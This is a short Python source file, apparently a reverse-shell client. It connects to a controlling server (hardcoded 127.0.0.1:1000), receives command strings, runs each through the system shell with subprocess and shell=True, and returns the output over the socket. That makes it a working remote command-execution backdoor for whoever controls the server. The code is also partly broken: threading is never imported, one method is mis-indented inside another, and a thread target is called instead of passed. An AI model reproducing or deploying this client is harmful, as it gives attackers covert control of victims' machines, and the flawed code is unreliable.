import socket
import subprocess

class client:
	def __init__(self, server_ip, server_port):
		self.ip = server_ip
		self.port = server_port
		self.server_address = (self.ip, self.port)
		self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connect()

#sending the connection to the server and reciving the command
	def connect(self):
		try:
			self.client_socket.connect(self.server_address)
			print('connected to server...')
			done = True
			while done:
				command = self.client_socket.recv(1024).decode('utf-8')
				if command == 'exit' or command == 'quit':
					done = False
				elif command == 'communicate1':
					threading.Thread(target=self.communication_1_way()).start()
				proc = subprocess.run(args=command, shell=True, capture_output=True)
				if proc.stdout == b'':
					if proc.stderr != b'':
						self.client_socket.send(proc.stderr)
					else:
						self.client_socket.send(b"Executed")
				else:
					self.client_socket.send(proc.stdout)
			self.client_socket.close()
			print("connection closed!")
		except Exception as e:
			print(e)

		def communication_1_way(self):
			done = True
			while done:
				print('Talk> ',end='')
				msg = self.client_socket.recv(1024).decode('utf-8')
				if msg == 'exit' or msg == 'quit':
					done = False
				else:
					print(msg)

if __name__ == '__main__':
	client('127.0.0.1', 1000)
